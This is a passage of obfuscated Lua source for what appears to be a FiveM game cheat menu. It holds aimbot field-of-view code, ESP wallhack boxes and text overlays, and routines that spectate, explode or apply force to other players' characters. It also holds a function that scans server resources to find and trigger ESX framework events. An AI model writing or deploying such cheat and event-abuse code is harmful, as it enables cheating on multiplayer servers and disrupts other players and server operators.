        local xright = menux + 0.163
        __REAPER1__.F.DrawText(__REAPER1__.F.FloatLength(__REAPER1__.V.DPlyCoords.x, 3) .. ' ' .. __REAPER1__.F.FloatLength(__REAPER1__.V.DPlyCoords.y, 3) .. ' ' .. __REAPER1__.F.FloatLength(__REAPER1__.V.DPlyCoords.z, 3), 0, ypos - 0.045, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.F.FloatLength(#(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed) - coords), 1) .. ' m', 0, ypos - 0.025, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.CurrentPedStatus(ped), 0, ypos - 0.005, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.IsPedMale(ped) and 'Male' or 'Female', 0, ypos + 0.015, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText((__REAPER1__.N.GetEntityModel(ped) ~= 1885233650 or __REAPER1__.N.GetEntityModel(ped) ~= -1667301416) and 'Yes' or 'No', 0, ypos + 0.035, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.GetCurrentStreet(coords.x, coords.y, coords.z), 0, ypos + 0.055, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.T.Zones[__REAPER1__.N.GetNameOfZone(coords.x, coords.y, coords.z)], 0, ypos + 0.075, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.IsPedShooting(ped) and 'Yes' or 'No', 0, ypos + 0.095, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.T.WeaponsHash[fegyo] or 'None', 0, ypos + 0.115, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.IsPedInAnyVehicle(ped) and __REAPER1__.N.GetVehicleName(__REAPER1__.N.GetVehiclePedIsIn(ped)) or 'Not in vehicle', 0, ypos + 0.135, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(car == 'carnotfound' and 'Getting in vehicle' or car or 'No last vehicle', 0, ypos + 0.155, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.ShouldUseMetricMeasurements() and __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(ped) * 3.6, 0) .. ' km/h' or __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(ped) * 2.2369, 0) .. ' mp/h', 0, ypos + 0.175, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.IsPedRagdoll(ped) and 'Yes' or 'No', 0, ypos + 0.195, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        
        __REAPER1__.F.DrawText(id, 0, ypos + 0.215, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, menux + 0.079)
        __REAPER1__.F.DrawText(__REAPER1__.N.GetPlayerServerId(id), 0, ypos + 0.235, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, menux + 0.079)
        __REAPER1__.F.DrawText(ped, 0, ypos + 0.255, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, menux + 0.079)
        __REAPER1__.F.DrawText(__REAPER1__.F.FloatLength(__REAPER1__.V.DPlyHeading, 1), 0, ypos + 0.275, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, menux + 0.079)
        
        __REAPER1__.F.DrawText(__REAPER1__.N.GetEntityHealth(ped) .. '/' .. __REAPER1__.N.GetEntityMaxHealth(ped), 0, ypos + 0.215, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.GetPedArmour(ped) .. '/' .. __REAPER1__.N.GetPlayerMaxArmour(id), 0, ypos + 0.235, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.GetEntityCanBeDamaged(ped) and 'No' or 'Yes', 0, ypos + 0.255, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        __REAPER1__.F.DrawText(__REAPER1__.N.IsEntityVisible(ped) and 'Yes' or 'No', 0, ypos + 0.275, 0, 255, 255, 255, 255, 0.26, false, false, false, true, 0, xright)
        
        __REAPER1__.N.DrawSprite('__REAPER17__', '__REAPER18__', (xpos * 2) + xwidth - 0.01 + __REAPER1__.M.PDatax, ypos + 0.103, 0.18, 0.41, 0.0, 255, 255, 255, 190)
    end

    __REAPER1__.F.RgbColors = function(speed, alpha)
        local n = __REAPER1__.N.GetGameTimer() / 300
        local r, g, b = math.floor(math.sin(n * speed) * 127 + 128), math.floor(math.sin(n * speed + 2) * 127 + 128), math.floor(math.sin(n * speed + 4) * 127 + 128)
        return r, g, b, alpha == nil and 255 or alpha
    end

    __REAPER1__.F.AimfovBuild = function()
        local r = tonumber(__REAPER1__.A['combat:aimbot_range'].func)
        if type(r) == 'number' then
            __REAPER1__.T.AimfovPoints = {}
            local x, y, r = 0.5, 0.5, r / 275
            for i = 1, 360 do
                local angle = i * math.pi / 180
                __REAPER1__.T.AimfovPoints[#__REAPER1__.T.AimfovPoints + 1] = {
                    x = x + r * math.cos( angle ) / 1.8,
                    y = y + r * math.sin( angle )
                }
            end
        end
    end
    __REAPER1__.F.AimfovBuild()

    __REAPER1__.F.AimfovIsIn = function(fx, fy)
        for i = 1, 180 do
            if math.abs(fx - 0.5) < math.abs( (__REAPER1__.T.AimfovPoints[i].x - __REAPER1__.T.AimfovPoints[i+180].x) / 2 ) and math.abs(fy - 0.5) < math.abs( (__REAPER1__.T.AimfovPoints[i].y - __REAPER1__.T.AimfovPoints[i+180].y) / 2 ) then
                return true
            end
        end
        return false
    end

    __REAPER1__.F.ApplyShockwave = function(entity, pos, coord)
        local tc = vector3(coord.x - pos.x, coord.y - pos.y, coord.z - pos.z)
        local distance = math.sqrt(tc.x * tc.x + tc.y * tc.y + tc.z * tc.z)
        local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
        __REAPER1__.N.ApplyForceToEntity(entity, 1, distanceRate * tc.x, distanceRate * tc.y, distanceRate * tc.z, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
    end

    __REAPER1__.F.VehicleCustomCheck = function()
        if __REAPER1__.N.GetVehicleModKit(__REAPER1__.V.CurrentVehicle) ~= __REAPER1__.A['vehicle:customs_modkit'].sindex - 1 then
            __REAPER1__.N.SetVehicleModKit(__REAPER1__.V.CurrentVehicle, __REAPER1__.A['vehicle:customs_modkit'].sindex - 1)
        end

        local mods = {'vehicle:customs_spoiler', 'vehicle:customs_frontbumper', 'vehicle:customs_rearbumper', 'vehicle:customs_sideskirt', 'vehicle:customs_exhaust', 'vehicle:customs_frame', 'vehicle:customs_grille', 'vehicle:customs_hood',
        'vehicle:customs_dial', 'vehicle:customs_dashboard', 'vehicle:customs_ornaments', 'vehicle:customs_trim', 'vehicle:customs_vanityplates', 'vehicle:customs_plateholder', 'vehicle:customs_tank', 'vehicle:customs_livery', 'vehicle:customs_roof', 'vehicle:customs_rightfender', 'vehicle:customs_fender', 
        'vehicle:customs_doorspeaker', 'vehicle:customs_seats', 'vehicle:customs_steeringwheels', 'vehicle:customs_shifterleavers', 'vehicle:customs_plaques', 'vehicle:customs_speakers', 'vehicle:customs_trunk', 'vehicle:customs_hydraulics', 'vehicle:customs_engineblock', 'vehicle:customs_airfilter', 'vehicle:customs_aerials', 
        'vehicle:customs_trim2'}

        for k,v in ipairs(mods) do
            local t = __REAPER1__.A[v]
            local vehmods = __REAPER1__.N.GetNumVehicleMods(__REAPER1__.V.CurrentVehicle, t.extra)
            if vehmods > 0 then
                local t2 = {}
                for i = - 1, vehmods - 1 do
                    table.insert(t2, i)
                end

                t.func, t.cindex, t.sindex = t2, 1, 1
            elseif t.func[1] ~= 'None' then
                t.func = {'None'}
            end

            t.cindex, t.sindex = 1, 1
        end
    end

    __REAPER1__.F.Spairs = function(t, order)
        -- collect the keys
        local keys = {}
        for k in pairs(t) do keys[#keys+1] = k end
    
        -- if order function given, sort by it by passing the table and keys a, b,
        -- otherwise just sort the keys 
        if order then
            table.sort(keys, function(a,b) return order(t, a, b) end)
        else
            table.sort(keys)
        end
    
        -- return the iterator function
        local i = 0
        return function()
            if not order or i <= 31 then
                i = i + 1
                if keys[i] then
                    return keys[i], t[keys[i]]
                end
            end
        end
    end

    __REAPER1__.F.IsInVeh = function(ped, msg)
        if __REAPER1__.V.CurrentVehicle ~= 0 then
            __REAPER1__.F.AddNotification(msg, 3000, 0, 170, 10)
            return true
        else
            __REAPER1__.F.AddNotification('Not in vehicle.', 3000, 210, 210, 0)
        end
        return false
    end

    __REAPER1__.F.AddSpecPerson = function(id)
        if __REAPER1__.T.SpecPeople[1] then
            for k,v in ipairs(__REAPER1__.T.SpecPeople) do
                if id == v.id then
                    return
                end
            end

            table.insert(__REAPER1__.T.SpecPeople, {id = id, name = __REAPER1__.N.GetPlayerName(__REAPER1__.N.GetPlayerFromServerId(id)), time = __REAPER1__.N.GetGameTimer(), y = __REAPER1__.T.SpecPeople[#__REAPER1__.T.SpecPeople].y + 0.018})
        else
            table.insert(__REAPER1__.T.SpecPeople, {id = id, name = __REAPER1__.N.GetPlayerName(__REAPER1__.N.GetPlayerFromServerId(id)), time = __REAPER1__.N.GetGameTimer(), y = 0.121})
        end
    end

    __REAPER1__.F.Color = function(dkey, dkey2, alpha)
        if __REAPER1__.A[dkey].sindex == 1 then
            return __REAPER1__.F.MenuExtra(dkey2)
        elseif __REAPER1__.A[dkey].sindex == 2 then
            return math.random(255), math.random(255), math.random(255), alpha == nil and 255 or alpha
        elseif __REAPER1__.A[dkey].sindex == 3 then
            return __REAPER1__.F.RgbColors(1.0, alpha)
        end
    end

    __REAPER1__.F.BarColor = function(dkey, dkey2, alpha, hp, maxhp)
        if __REAPER1__.A[dkey].sindex == 1 then
            local thing = 255 / maxhp
            return __REAPER1__.F.FloatLength(thing * (maxhp - hp), 0), __REAPER1__.F.FloatLength(thing * hp, 0), 0, alpha or 255
        elseif __REAPER1__.A[dkey].sindex == 2 then
            return __REAPER1__.F.MenuExtra(dkey2)
        elseif __REAPER1__.A[dkey].sindex == 3 then
            return math.random(255), math.random(255), math.random(255), alpha or 255
        elseif __REAPER1__.A[dkey].sindex == 4 then
            return __REAPER1__.F.RgbColors(1.0, alpha)
        end
    end

    __REAPER1__.F.LoopedPlayer = function(option, id, dkey, bool)
        for k,v in ipairs(__REAPER1__.T.LoopedPlayers) do
            if v.id == id then
                v.option[option] = not v.option[option]
                if not v.option.spec and not v.option.exploding and not v.option.itraced and not v.option.btraced and not v.option.cartoon and not v.option.explodingbullets and not v.option.particle and not v.option.sound and not v.option.soundr and not v.option.soundr2 then
                    table.remove(__REAPER1__.T.LoopedPlayers, k)
                end
                return
            elseif option == 'spec' and v.option.spec and bool == true then
                v.option.spec = false
                __REAPER1__.A[v.dkey .. '_spectate'].func = false
                if not v.option.spec and not v.option.exploding and not v.option.itraced and not v.option.btraced and not v.option.cartoon and not v.option.explodingbullets and not v.option.particle and not v.option.sound and not v.option.soundr and not v.option.soundr2 then
                    table.remove(__REAPER1__.T.LoopedPlayers, k)
                end
                __REAPER1__.N.PointCamAtEntity(__REAPER1__.V.SpectatingCamera, __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(id)), 1, 1, 1, 1)
            end
        end

        local options = {spec = false, exploding = false, itraced = false, btraced = false, cartoon = false, explodingbullets = false, particle = false, sound = false, soundr = false, soundr2 = false}
        options[option] = true
        table.insert(__REAPER1__.T.LoopedPlayers, {id = id, dkey = dkey, option = options})
    end

    __REAPER1__.F.DynamicTrigger = function(reso, event, filter)
        local trigger = nil
        local files = __REAPER1__.N.LoadResourceFile(reso, 'fxmanifest.lua')
        if __REAPER1__.N.LoadResourceFile(reso, "__resource.lua") then
            files = __REAPER1__.N.LoadResourceFile(reso, '__resource.lua')
        end

        if files then
            for k,v in ipairs(__REAPER1__.F.StringSplit(files, "\n")) do
                local s1, s2 = string.find(v, ".lua", 1, true)
                if s1 then
                    local thefiles = __REAPER1__.N.LoadResourceFile(reso, __REAPER1__.F.CleanString(v))
                    if thefiles then
                        for x,d in ipairs(__REAPER1__.F.StringSplit(thefiles, "\n")) do
                            if string.match(d, event) then
                                trigger = __REAPER1__.F.CleanString(d)
                            end
                            if string.match(d, filter) and trigger then
                                __REAPER1__.F.AddNotification('Event found.', 5000, 0, 170, 10)
                                return trigger
                            end
                        end
                    end
                end
            end
        end

        __REAPER1__.F.AddNotification('Resource couldn\'t be found.', 5000, 255, 0, 0)
        return nil
    end

    __REAPER1__.F.LoadEsx = function()
        if not __REAPER1__.T.ESX then
            __REAPER1__.V.TriggerEsx = __REAPER1__.F.DynamicTrigger('es_extended', 'AddEventHandler', 'cb%(')
            local timer = 0
            
            while not __REAPER1__.T.ESX and timer < 100 do
                __REAPER1__.N.TriggerEvent(__REAPER1__.V.TriggerEsx, function(obj) __REAPER1__.T.ESX = obj end)
                __REAPER26__(100)
                timer = timer + 1
            end
        end

        return true
    end

    __REAPER1__.F.LoopPlayers = function(tipus, func, wait, ...)
        local a, b, d, c, d, e, f, g, h, i = ...
        __REAPER25__(function()
            if tipus == 'all' then
                for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                    local ped = __REAPER1__.N.GetPlayerPed(v)
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                        if not __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed) ~= veh or __REAPER1__.A['server:allplayers_includeself'].func and __REAPER1__.F.NetControl(veh) then
                            func(veh, a, b, d, c, d, e, f, g, h, i)
                        end
                    end

                    __REAPER26__(wait)
                end
            else
                for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                    local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                    if __REAPER1__.N.IsPedInAnyVehicle(ped) then
                        local veh = __REAPER1__.N.GetVehiclePedIsIn(ped)
                        if __REAPER1__.F.NetControl(veh) then
                            func(veh, a, b, d, c, d, e, f, g, h, i)
                        end
                    end

                    __REAPER26__(wait)
                end
            end
        end)
    end

    __REAPER1__.F.WeaponEditorWeapon = function(p1)
        local a1, a2 = string.find(p1, ':', 1, true)
        local b1, b2 = string.find(p1, '_', 1, true)

        if string.find(p1, 'mk2', 1, true) then
            return __REAPER1__.N.GetHashKey('weapon_' .. string.sub(p1, a1 + 1, b1 + 3))
        else
            return __REAPER1__.N.GetHashKey('weapon_' .. string.sub(p1, a1 + 1, b1 - 1))
        end
    end

    __REAPER1__.F.DrawCrosshair = function(typo, crosshair, r, g, b, a)
        if __REAPER1__.A['combat:crosshair_hover'].func or __REAPER1__.A['combat:crosshair_ttype'].toggle then
            local coords, entity = __REAPER1__.M.RayCastGameplayCamera(400.0)

            if __REAPER1__.A['combat:crosshair_hover'].func and (__REAPER1__.A['combat:crosshair_htype'].sindex == 1 and typo == 'p' or __REAPER1__.A['combat:crosshair_htype'].sindex == 2 and typo == 's' or __REAPER1__.A['combat:crosshair_htype'].sindex == 3) and __REAPER1__.A['combat:crosshair_hentity'].sindex == 1 and __REAPER1__.N.IsEntityAPed(entity) or __REAPER1__.A['combat:crosshair_hentity'].sindex == 2 and __REAPER1__.N.IsPedAPlayer(entity) or __REAPER1__.A['combat:crosshair_hentity'].sindex == 3 and __REAPER1__.N.IsEntityAVehicle(entity) then
                r, g, b, a = __REAPER1__.F.Color('combat:crosshair_hcolortype', 'combat:crosshair_hcolor')
            elseif __REAPER1__.F.TlistCheck(entity) and (__REAPER1__.A['combat:crosshair_ttype'].sindex == 1 and typo == 'p' or __REAPER1__.A['combat:crosshair_ttype'].sindex == 2 and typo == 's' or __REAPER1__.A['combat:crosshair_ttype'].sindex == 3) then
                r, g, b, a = __REAPER1__.F.Color('combat:crosshair_tcolortype', 'combat:crosshair_tcolor')
            end
        end

        if crosshair == 1 then
            local gap = typo == 'p' and __REAPER1__.A['combat:crosshair_gapsize'].sindex / 3 or __REAPER1__.A['combat:crosshair_sgapsize'].sindex / 3
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 10 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 10
            __REAPER1__.N.DrawRect(0.5, 0.5 - (gap / __REAPER1__.M.ScreenResoy), 0.001 * size, 0.01 * size, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5, 0.5 + (gap / __REAPER1__.M.ScreenResoy), 0.001 * size, 0.01 * size, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5 + (gap / __REAPER1__.M.ScreenResox), 0.5, 0.006 * size, 0.001 * size * 2, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5 - (gap / __REAPER1__.M.ScreenResox), 0.5, 0.006 * size, 0.001 * size * 2, r, g, b, a)
        elseif crosshair == 2 then
            local gap = typo == 'p' and __REAPER1__.A['combat:crosshair_gapsize'].sindex / 3 or __REAPER1__.A['combat:crosshair_sgapsize'].sindex / 3
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 10 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 10
            __REAPER1__.N.DrawRect(0.5, 0.5 - (gap / __REAPER1__.M.ScreenResoy), 0.001 * size, 0.01 * size, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5, 0.5 + (gap / __REAPER1__.M.ScreenResoy), 0.001 * size, 0.01 * size, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5 + (gap / __REAPER1__.M.ScreenResox), 0.5, 0.006 * size, 0.001 * size * 2, r, g, b, a)
            __REAPER1__.N.DrawRect(0.5 - (gap / __REAPER1__.M.ScreenResox), 0.5, 0.006 * size, 0.001 * size * 2, r, g, b, a)
            __REAPER1__.N.DrawSprite("mprankbadge", "globe_bg", 0.5, 0.5, 0.0025 * size, 0.0045 * size, 0.0, r, g, b, a, true)
        elseif crosshair == 3 then
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 5 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 5
            __REAPER1__.N.DrawSprite("mprankbadge", "globe_bg", 0.5, 0.5, 0.004 * size, 0.007 * size, 0.0, r, g, b, a, true)
        elseif crosshair == 4 then
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 5 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 5
            __REAPER1__.N.DrawSprite("darts", "dart_reticules", 0.5, 0.5, 0.0025 * size, 0.00425 * size, 0.0, r, g, b, a, true)
        elseif crosshair == 5 then
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 5 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 5
            __REAPER1__.N.DrawSprite("mpleaderboard", "leaderboard_kd_icon", 0.5, 0.5, 0.005 * size, 0.009 * size, 0.0 ,r, g, b, a, true)
        elseif crosshair == 6 then
            local size = typo == 'p' and __REAPER1__.A['combat:crosshair_thickness'].sindex / 10 or __REAPER1__.A['combat:crosshair_sthickness'].sindex / 10
            __REAPER1__.N.DrawSprite("mparrow", "mp_arrowxlarge", 0.5, 0.51, 0.005 * size, 0.005 * size, 270.0, r, g, b, a, true)
        end
    end

    __REAPER1__.F.EntityDimensions = function(entity, tipus)
        local model = __REAPER1__.N.GetEntityModel(entity)
        local min, max = __REAPER1__.N.GetModelDimensions(model)

        if __REAPER1__.N.IsEntityAVehicle(entity) then
            max = vector3(max.x - 0.2 + 0.3, max.y + 0.15, max.z)
            min = vector3(min.x + 0.2 - 0.3, min.y - 0.15, min.z)
        else
            max = vector3(max.x - 0.2, max.y + 0.15, max.z)
            min = vector3(min.x + 0.2, min.y - 0.15, min.z + 0.2)
        end

        if tipus == 'min' then
            local tfr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, max)
            local bbl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, min)
            local bbr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
            local tfl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
            
            return tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl
        else
            local tfr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, max)
            local tbr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
            local bfr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
            local bbr = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
    
            local tfl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
            local tbl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
            local bfl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
            local bbl = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(entity, min)

            return tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl
        end
    end

    __REAPER1__.F.Entity2dDimensions = function(c, tfr, bbl, tfl, bbr)
        local ret, sx, sy = __REAPER1__.N.GetScreenCoordFromWorldCoord(c.x, c.y, c.z)

        local ret, xu, yu = __REAPER1__.N.GetScreenCoordFromWorldCoord(tfr.x, tfr.y, tfr.z)
        local ret, xb, yb = __REAPER1__.N.GetScreenCoordFromWorldCoord(bbl.x, bbl.y, bbl.z)
        local w, y = math.abs(xu - xb), math.abs(yu - yb)

        local ret, xu2, yu2 = __REAPER1__.N.GetScreenCoordFromWorldCoord(tfl.x, tfl.y, tfl.z)
        local ret, xb2, yb2 = __REAPER1__.N.GetScreenCoordFromWorldCoord(bbr.x, bbr.y, bbr.z)
        local w2, y2 = math.abs(xu2 - xb2), math.abs(yu2 - yb2)

        return sx, sy, w, y, w2, y2
    end

    __REAPER1__.F.BoundingBox = function(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
        local r, g, b, a = __REAPER1__.F.Color('visuals_colortype', 'visuals_color', 100)
        -- RIGHT SIDE
        __REAPER1__.N.DrawLine(tfr + 0.001, tbr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr, tbr, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr - 0.001, tbr - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(tfr + 0.001, bfr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr, bfr, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr - 0.001, bfr - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(bfr + 0.001, bbr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(bfr, bbr, r, g, b, a)
        __REAPER1__.N.DrawLine(bfr - 0.001, bbr - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(tbr + 0.001, bbr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tbr, bbr, r, g, b, a)
        __REAPER1__.N.DrawLine(tbr - 0.001, bbr - 0.001, r, g, b, a)

        -- LEFT SIDE
        __REAPER1__.N.DrawLine(tfl + 0.001, tbl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tfl, tbl, r, g, b, a)
        __REAPER1__.N.DrawLine(tfl - 0.001, tbl - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(tbl + 0.001, bbl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tbl, bbl, r, g, b, a)
        __REAPER1__.N.DrawLine(tbl - 0.001, bbl - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(tfl + 0.001, bfl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tfl, bfl, r, g, b, a)
        __REAPER1__.N.DrawLine(tfl - 0.001, bfl - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(bfl + 0.001, bbl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(bfl, bbl, r, g, b, a)
        __REAPER1__.N.DrawLine(bfl - 0.001, bbl - 0.001, r, g, b, a)


        -- Connection
        __REAPER1__.N.DrawLine(tfr + 0.001, tfl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr, tfl, r, g, b, a)
        __REAPER1__.N.DrawLine(tfr - 0.001, tfl - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(tbr + 0.001, tbl + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(tbr, tbl, r, g, b, a)
        __REAPER1__.N.DrawLine(tbr - 0.001, tbl - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(bfl + 0.001, bfr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(bfl, bfr, r, g, b, a)
        __REAPER1__.N.DrawLine(bfl - 0.001, bfr - 0.001, r, g, b, a)

        __REAPER1__.N.DrawLine(bbl + 0.001, bbr + 0.001, r, g, b, a)
        __REAPER1__.N.DrawLine(bbl, bbr, r, g, b, a)
        __REAPER1__.N.DrawLine(bbl - 0.001, bbr - 0.001, r, g, b, a)
    end

    __REAPER1__.F.BoundingBoxFill = function(tfr, tbr, bfr, bbr, tfl, tbl, bfl, bbl)
        local r, g, b, a = __REAPER1__.F.Color('visuals_fcolortype', 'visuals_fcolor', 100)

        -- FRONT
        __REAPER1__.N.DrawPoly(tfl, tfr, bfr, r, g, b, a)
        __REAPER1__.N.DrawPoly(bfr, bfl, tfl, r, g, b, a)

        -- TOP
        __REAPER1__.N.DrawPoly(tfr, tfl, tbr, r, g, b, a)
        __REAPER1__.N.DrawPoly(tfl, tbl, tbr, r, g, b, a)

        -- BACK
        __REAPER1__.N.DrawPoly(tbr, tbl, bbr, r, g, b, a)
        __REAPER1__.N.DrawPoly(tbl, bbl, bbr, r, g, b, a)

        -- LEFT
        __REAPER1__.N.DrawPoly(tbl, tfl, bfl, r, g, b, a)
        __REAPER1__.N.DrawPoly(bfl, bbl, tbl, r, g, b, a)

        -- RIGHT
        __REAPER1__.N.DrawPoly(tfr, tbr, bfr, r, g, b, a)
        __REAPER1__.N.DrawPoly(tbr, bbr, bfr, r, g, b, a)

        -- BOTTOM
        __REAPER1__.N.DrawPoly(bfl, bfr, bbr, r, g, b, a)
        __REAPER1__.N.DrawPoly(bbr, bbl, bfl, r, g, b, a)
    end

    __REAPER1__.F.DrawTextEsp = function(v, c, coords)
        local r, g, b, a = __REAPER1__.F.Color('visuals:textesp_colortype', 'visuals:textesp_color')
        if __REAPER1__.A['visuals:textesp_secondarycolor'].toggle and (__REAPER1__.A['visuals:textesp_secondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:textesp_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:textesp_ocolortype', 'visuals:textesp_ocolor')
        end

        local name = nil
        if __REAPER1__.N.IsEntityAPed(v) then
            if __REAPER1__.N.IsPedAPlayer(v) then
                local ply = __REAPER1__.N.NetworkGetPlayerIndexFromPed(v)
                name = __REAPER1__.N.GetPlayerName(ply)
                if __REAPER1__.A['visuals:textesp_information'].extra[1] then
                    name = '[' .. __REAPER1__.N.GetPlayerServerId(ply) .. '] ' .. name
                end
            else
                name = v
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[2] then
                name = name .. ' (' .. __REAPER1__.F.FloatLength(#(c - coords), 0) .. 'm)'
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[3] then
                name = name .. ' HP: ' .. __REAPER1__.N.GetEntityHealth(v)
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[4] then
                name = name .. ' AR :' .. __REAPER1__.N.GetPedArmour(v)
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[5] then
                name = name .. '\n' .. __REAPER1__.N.CurrentPedStatus(v)
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[6] then
                name = not __REAPER1__.A['visuals:textesp_information'].extra[5] and name .. ('\n' .. (__REAPER1__.T.WeaponsHash[__REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed)] or 'Unknown') or ' | ' .. (__REAPER1__.T.WeaponsHash[__REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed)] or 'Unknown'))
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[7] then
                name = not __REAPER1__.A['visuals:textesp_information'].extra[5] and not __REAPER1__.A['visuals:textesp_information'].extra[6] and name .. ('\n' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(v) * 3.6, 0) .. ' km/h' or ' | ' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(v) * 3.6, 0) .. ' km/h')
            end
        else
            name = __REAPER1__.N.IsEntityAVehicle(v) and __REAPER1__.N.GetVehicleName(v) or v
            if __REAPER1__.A['visuals:textesp_information'].extra[2] then
                name = name .. ' (' .. __REAPER1__.F.FloatLength(#(c - coords), 0) .. 'm)'
            end
